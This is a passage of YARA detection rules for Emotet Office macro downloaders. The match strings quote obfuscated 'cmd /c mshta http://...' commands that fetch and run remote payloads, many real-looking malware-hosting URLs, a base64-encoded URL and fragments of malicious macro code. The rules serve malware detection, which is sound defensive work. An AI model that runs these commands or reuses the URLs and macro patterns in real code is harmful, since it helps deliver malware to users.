        $x_1_1 = {63 6d 64 20 2f 63 20 6d 5e 73 68 5e 74 5e 61 20 68 5e 74 74 5e 70 5e 3a 2f 5e 2f 38 37 2e 32 35 31 2e 38 36 2e 31 37 38 2f 70 70 2f [0-2] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_NEMF_2147799331_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.NEMF!MTB"
        threat_id = "2147799331"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-48] 28 22 [0-48] 2e [0-48] 22 2c 20 22 [0-16] 22 29 2c 20 22 22 29 2e 52 75 6e 20 [0-48] 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = {68 3d 5c 22 22 63 [0-6] 3a [0-6] 70 [0-6] 72 [0-6] 6f [0-6] 67 [0-6] 72 [0-6] 61 [0-6] 6d [0-6] 64 [0-6] 61 [0-6] 74 [0-6] 61}  //weight: 1, accuracy: Low
        $x_1_3 = "ra = Replace(s1, \",\", \"\")" ascii //weight: 1
        $x_1_4 = "txt$ = FileToVBAFunction(\",\", \",\")" ascii //weight: 1
        $x_1_5 = "F_Content$ = F_Content$ & \"&\" & res$ & \"\" & vbNewLine" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVB_2147805206_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVB!MTB"
        threat_id = "2147805206"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/185.7.214.7/ve/ve.html" ascii //weight: 1
        $x_1_2 = "cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/fer/fe3.html" ascii //weight: 1
        $x_1_3 = "m^sh^t^a h^tt^p^:/^/0x5cff39c3/sec/se3.html" ascii //weight: 1
        $x_1_4 = {6d 73 5e 68 5e 74 61 20 68 74 5e 74 70 3a 2f 5e 2f 30 78 5e 62 5e 39 30 37 64 36 30 5e 37 2f 66 65 5e 72 2f 66 65 ?? 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_5 = "cmd /c mshta http://91.240.118.168/qqw/aas/se.html" ascii //weight: 1
        $x_1_6 = "cmd /c mshta http://91.240.118.168/zx/cv/fe.html" ascii //weight: 1
        $x_1_7 = "cmd /c mshta http://91.240.118.168/zzx/ccv/fe.html" ascii //weight: 1
        $x_1_8 = "ms^hta http://91.2^40.118.1^68/vvv/ppp/f^e.ht^m^l" ascii //weight: 1
        $x_1_9 = "ms^hta http://91.2^40.118.1^68/oo/aa/s^e.ht^m^l" ascii //weight: 1
        $x_1_10 = "mshta http://91.240.118.172/hh/hh.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BB_2147806033_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BB!MTB"
        threat_id = "2147806033"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "= Replace(tysdjoighdlfkgnxlcdsf.TextBox1.Text, \"wgja\", \"\")" ascii //weight: 1
        $x_1_2 = "Text = \"cwgjamd /wgjac swgjatarwgjat/wgjaB" ascii //weight: 1
        $x_1_3 = ".Tag = Cells(75, 1) + vbCrLf + Cells(77, 1)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RVAA_2147807212_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RVAA!MTB"
        threat_id = "2147807212"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "HWxIHhv = CallByName(sbQrKWe, tgcAmc, 1, uAsB)" ascii //weight: 1
        $x_1_2 = "Mid(Cia, jXEF(qy), 1)" ascii //weight: 1
        $x_1_3 = "CallByName dllBRu, mDCEr, 1, yGgfO.Items, 4" ascii //weight: 1
        $x_1_4 = "AutoOpen()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDE_2147807265_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDE!MTB"
        threat_id = "2147807265"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://ajmotorsshop.com/grad-ooze/O/" ascii //weight: 1
        $x_1_2 = "://msubrahm.com/wp-admin/5SjBp9WHfGbtgY/" ascii //weight: 1
        $x_1_3 = "://moveconnects.com/item-immo/5NAtMXXCkzQ5NrX3z/9moeTie4vHJ/" ascii //weight: 1
        $x_1_4 = "://beta2.emeritus.org/wp-content.previous/WS0O/" ascii //weight: 1
        $x_1_5 = "://karmapedia.com/wp-includes/edvf/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_BEM_2147807279_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.BEM!MTB"
        threat_id = "2147807279"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Replace(Cells(65, 1), \"ern\", \"\")" ascii //weight: 1
        $x_1_2 = "Open \"c:\\programdata\\vkwer.bat\"" ascii //weight: 1
        $x_1_3 = "strMessage = \" \" & .Name & \" , \" & vbCr & _" ascii //weight: 1
        $x_1_4 = "MsgBox Err.Description, vbCritical, \" & \" & Err.Number" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EXNL_2147809988_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EXNL!MTB"
        threat_id = "2147809988"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://www.cuneytkocas.com/wp-content/VSnofpES1wO2CcVob/" ascii //weight: 1
        $x_1_2 = "http://towardsun.net/admin/BYGGkrYAnT/" ascii //weight: 1
        $x_1_3 = "http://k-antiques.jp/wp-includes/SCYdA6TLohYk2/" ascii //weight: 1
        $x_1_4 = "http://ordinateur.ogivart.us/editor/Qpo7OAOnbe/" ascii //weight: 1
        $x_1_5 = "http://old.liceum9.ru/images/0/" ascii //weight: 1
        $x_1_6 = "http://ostadsarma.com/wp-admin/pYk64Hh3z5hjnMziZ/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDA_2147810024_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDA!MTB"
        threat_id = "2147810024"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"ttp\"&\"s://ca\"&\"no\"&\"pu\"&\"se\"&\"ng.i\"&\"n/b/5\"&\"G1\"&\"sl\"&\"6x/\"," ascii //weight: 1
        $x_1_2 = "\"h\"&\"ttp\"&\"://se\"&\"sc\"&\"o-k\"&\"s.c\"&\"o\"&\"m/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/r\"&\"DA\"&\"RA\"&\"Cy\"&\"F1\"&\"lD\"&\"Oz\"&\"9G\"&\"P1\"&\"r/\"," ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"p://d\"&\"e\"&\"v.le\"&\"ar\"&\"nc\"&\"ar\"&\"au\"&\"di\"&\"o.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"i\"&\"n/v6\"&\"IK\"&\"ID\"&\"u9\"&\"0\"&\"k8\"&\"C6\"&\"Y8/\"," ascii //weight: 1
        $x_1_4 = "\"h\"&\"tt\"&\"p://f\"&\"as\"&\"tx\"&\"mf\"&\"g.c\"&\"o\"&\"m/vo\"&\"lu\"&\"pt\"&\"at\"&\"u\"&\"m-vo\"&\"lu\"&\"pt\"&\"at\"&\"um/r\"&\"h2\"&\"CN\"&\"MH\"&\"Nj\"&\"dg\"&\"b6/\"," ascii //weight: 1
        $x_1_5 = "\"h\"&\"tt\"&\"p://s\"&\"e\"&\"p.df\"&\"ws\"&\"ol\"&\"ar.c\"&\"lu\"&\"b/h\"&\"zh\"&\"3v/c0\"&\"83\"&\"uj\"&\"O5\"&\"b1\"&\"1t\"&\"uo\"&\"92/\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OWST_2147810210_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OWST!MTB"
        threat_id = "2147810210"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://wateringcanreview.xyz/wp-includes/css/qky11a/" ascii //weight: 1
        $x_1_2 = "http://cakemixturereview.xyz/wp-includes/U2ayYVCPRhWqERyw4/" ascii //weight: 1
        $x_1_3 = "http://15.237.135.38/dza9hr/kjt6/" ascii //weight: 1
        $x_1_4 = "http://shopnhap.com/highbinder/UedVfTHDf5Em40/" ascii //weight: 1
        $x_1_5 = "https://celhocortofilmfestival.stream/css/Naq/" ascii //weight: 1
        $x_1_6 = "https://astrologersandeepbhargav.com/wp-admin/FRwR9VH/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDB_2147810338_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDB!MTB"
        threat_id = "2147810338"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "\"h\"&\"tt\"&\"p:/\"&\"/ha\"&\"rd\"&\"st\"&\"on\"&\"ec\"&\"a\"&\"p.c\"&\"o\"&\"m/w\"&\"el\"&\"l-k\"&\"no\"&\"wn/l\"&\"W/\"," ascii //weight: 1
        $x_1_2 = "\"h\"&\"tt\"&\"p://h\"&\"oa\"&\"ng\"&\"le\"&\"ph\"&\"at.v\"&\"n/w\"&\"p-a\"&\"dm\"&\"in/9s\"&\"pO\"&\"9p\"&\"p/\"," ascii //weight: 1
        $x_1_3 = "\"h\"&\"tt\"&\"p://w\"&\"w\"&\"w.a\"&\"m\"&\"a.c\"&\"u/j\"&\"p\"&\"r/0\"&\"0\"&\"Yp\"&\"KF\"&\"EZ/\"," ascii //weight: 1
        $x_1_4 = "\"h\"&\"tt\"&\"p://sc\"&\"hi\"&\"ld\"&\"er\"&\"sbe\"&\"dri\"&\"jfd\"&\"sde\"&\"v\"&\"os.n\"&\"l/w\"&\"p-co\"&\"nt\"&\"en\"&\"t/It\"&\"nB\"&\"Dm\"&\"Ja\"&\"y1\"&\"Ud\"&\"k/" ascii //weight: 1
        $x_1_5 = "\"h\"&\"tt\"&\"p://jk\"&\"on\"&\"de\"&\"rh\"&\"ou\"&\"d.n\"&\"l/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/6\"&\"o\"&\"f/\"," ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_OWSU_2147810582_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.OWSU!MTB"
        threat_id = "2147810582"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://shop.lambolero.com/iiwkjgp/eu7rH6/" ascii //weight: 1
        $x_1_2 = "http://api.task-lite.com/-/EYe3DEfcw7LCaU6T/" ascii //weight: 1
        $x_1_3 = "https://celhocortofilmfestival.stream/css/oQSBr44obE/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMD_2147810604_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMD!MTB"
        threat_id = "2147810604"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/0xc12a24f5/cc.html" ascii //weight: 1
        $x_1_2 = "cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/c^c.h^tm^l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMK_2147810610_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMK!MTB"
        threat_id = "2147810610"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2f 22 2c 22 [0-15] 70 3a 2f 2f [0-223] 2e 63 22 26 22 6f 22 26 22 6d 2f [0-223] 2f 22 2c 22 [0-15] 73 3a 2f 2f [0-223] 2e 63 22 26 22 6f 22 26 22 6d 2f [0-223] 2f 22 2c 22 [0-15] 70 3a 2f 2f [0-223] 2e 63 22 26 22 6f 22 26 22 6d 2f [0-223] 2f 22 2c 22}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_RPA_2147810748_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.RPA!MTB"
        threat_id = "2147810748"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/92.255.57.195/ru/ru.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EXNP_2147810784_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EXNP!MTB"
        threat_id = "2147810784"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/fer/fer.html" ascii //weight: 1
        $x_1_2 = "m^sh^t^a h^tt^p^:/^/0x5cff39c3/sec/se1.html" ascii //weight: 1
        $x_1_3 = {3a 2f 5e 2f 30 5e 78 35 5e 62 66 5e 30 37 5e 36 61 5e 38 2f 73 65 2f 73 [0-4] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_4 = "m^sh^t^a h^tt^p^:/^/0xb907d607/fer/fe1.html" ascii //weight: 1
        $x_1_5 = "ms^h^ta ht^tp:/^/0x^b^907d60^7/fe^r/f^e4.h^tm^l" ascii //weight: 1
        $x_1_6 = ":/^/0x^b^907d60^7/fe^r/f^e5.h^tm^l" ascii //weight: 1
        $x_1_7 = {3a 2f 5e 2f 30 78 5e 35 63 66 5e 66 5e 33 39 63 5e 33 5e 2f 5e 73 65 63 5e 2f 5e 73 65 [0-3] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_AMDA_2147810938_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.AMDA!MTB"
        threat_id = "2147810938"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "cmd /c m^sh^t^a h^tt^p^:/^/0xb907d607/fer/fe2.html" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_EXNQ_2147811030_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.EXNQ!MTB"
        threat_id = "2147811030"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {63 6d 64 20 2f 63 20 6d 73 5e 68 5e 74 61 20 68 74 5e 74 70 3a 2f 5e 2f 30 78 5e 62 5e 39 30 37 64 36 30 5e 37 2f 66 65 5e 72 2f [0-8] 2e 68 5e 74 6d 5e 6c}  //weight: 1, accuracy: Low
        $x_1_2 = {3a 2f 5e 2f 30 78 5e 62 5e 39 30 37 64 36 30 5e 37 2f 66 65 5e 72 2f 66 [0-4] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_3 = {3a 2f 5e 2f 30 78 5e 62 5e 39 30 37 64 36 30 5e 37 2f 66 65 5e 72 2f [0-6] 2e 68 5e 74 6d 5e 6c}  //weight: 1, accuracy: Low
        $x_1_4 = {3a 2f 5e 2f 30 78 35 63 66 66 33 39 63 33 2f 73 65 63 2f 73 [0-4] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_5 = {3a 2f 5e 2f 30 78 5e 35 63 66 5e 66 5e 33 39 63 5e 33 5e 2f 5e 73 65 63 5e 2f 5e 73 [0-4] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
        $x_1_6 = {39 31 2e 32 34 30 2e 31 31 38 2e 31 36 38 2f 71 77 2f 61 73 2f 73 [0-4] 2e 68 74 6d 6c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_PDS_2147811118_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.PDS!MTB"
        threat_id = "2147811118"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "://www.aacitygroup.com/mordacity/g29PQhuYA5x/" ascii //weight: 1
        $x_1_2 = "://actividades.laforetlanguages.com/wp-admin/uKLMwQwwo0W/" ascii //weight: 1
        $x_1_3 = "://sse-studio.com/cq0xhpj/wdktmllfAYV/" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALA_2147811182_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALA!MTB"
        threat_id = "2147811182"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-255] 28 [0-255] 29 2c 20 22 22 29 2e 52 75 6e 20 [0-255] 2e 00 28 [0-255] 29 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_2 = "fileFilter:=\"H??L Files(*.htm), *.htm\")" ascii //weight: 1
        $x_1_3 = "Open \"C:\\primer.txt\" For Output As #1" ascii //weight: 1
        $x_1_4 = "strFileTitle = \"s\"" ascii //weight: 1
        $x_1_5 = "strFileName = \".\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALA_2147811182_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALA!MTB"
        threat_id = "2147811182"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {4f 70 65 6e 20 [0-255] 2e [0-255] 28 22 44 46 45 4e 22 2c 20 37 36 29 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 31}  //weight: 1, accuracy: Low
        $x_1_2 = "strFileTitle = \"s\"" ascii //weight: 1
        $x_1_3 = "strFileName = \".\"" ascii //weight: 1
        $x_1_4 = {50 72 69 6e 74 20 23 31 2c 20 [0-255] 2e [0-255] 28 22 35 22 2c 20 37 35 29 20 26 20 76 62 43 72 4c 66 20 2b 20 00 2e 01 28 22 2c 22 2c 20 37 37 29}  //weight: 1, accuracy: Low
        $x_1_5 = {43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-255] 28 22 62 6e 6c 73 77 65 53 64 22 2c 20 36 35 29 29 2e 43 72 65 61 74 65 4f 62 6a 65 63 74 28 00 28 22 64 34 52 54 48 34 35 22 2c 20 38 32 29 2c 20 22 22 29 2e 52 75 6e 20 [0-255] 2e 00 28 22 74 73 22 2c 20 37 36 29 2c 20 30}  //weight: 1, accuracy: Low
        $x_1_6 = "fileFilter:=\"H??L Files(*.htm), *.htm\")" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_ALA_2147811182_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.ALA!MTB"
        threat_id = "2147811182"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "n\"&\"at\"&\"ay\"&\"ak\"&\"im.c\"&\"o\"&\"mp\"&\"er\"&\"so\"&\"na\"&\"l/P\"&\"RB\"&\"Ha\"&\"Gb\"&\"b2\"&\"zV\"&\"gt\"&\"bM" ascii //weight: 1
        $x_1_2 = "e\"&\"st\"&\"ac\"&\"io\"&\"es\"&\"po\"&\"rt\"&\"iva\"&\"vil\"&\"an\"&\"ov\"&\"ai\"&\"la\"&\"ge\"&\"lt\"&\"r\"&\"u.c\"&\"a\"&\"t/t\"&\"m\"&\"p/T\"&\"sb\"&\"q55\"&\"gM\"&\"W8\"&\"b" ascii //weight: 1
        $x_1_3 = "t\"&\"g\"&\"as\"&\"ia\"&\"man\"&\"age\"&\"me\"&\"nt.c\"&\"o\"&\"m/w\"&\"p-c\"&\"on\"&\"te\"&\"nt/6\"&\"et\"&\"mW\"&\"Z" ascii //weight: 1
        $x_1_4 = "t\"&\"ek\"&\"st\"&\"il\"&\"uz\"&\"ma\"&\"ng\"&\"or\"&\"us\"&\"u.c\"&\"o\"&\"m/w\"&\"p-a\"&\"dm\"&\"in/M\"&\"eo\"&\"rL\"&\"o" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSM_2147811186_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSM!MTB"
        threat_id = "2147811186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "AGgAdAB0AHAAOgAvAC8AcgBrAGUAZQBwAGUAcgB1AGEALgBjAG8AbQAvAGkAbgBjAGwAdQBkAGUALwBGAFgAQgBzAFYA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSM_2147811186_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSM!MTB"
        threat_id = "2147811186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "strMessage = \"bks fgwhkjsd:\" & vbTab & Format(dblSales, \"$#,##0\") &" ascii //weight: 1
        $x_1_2 = "hgwki = Cells(106, 6): tuowq = Replace(Cells(107, 2), \"poi\", \"\")" ascii //weight: 1
        $x_1_3 = "MsgBox \"fWehrhse s5usdfgs\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Emotet_SSM_2147811186_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Emotet.SSM!MTB"
        threat_id = "2147811186"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Emotet"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
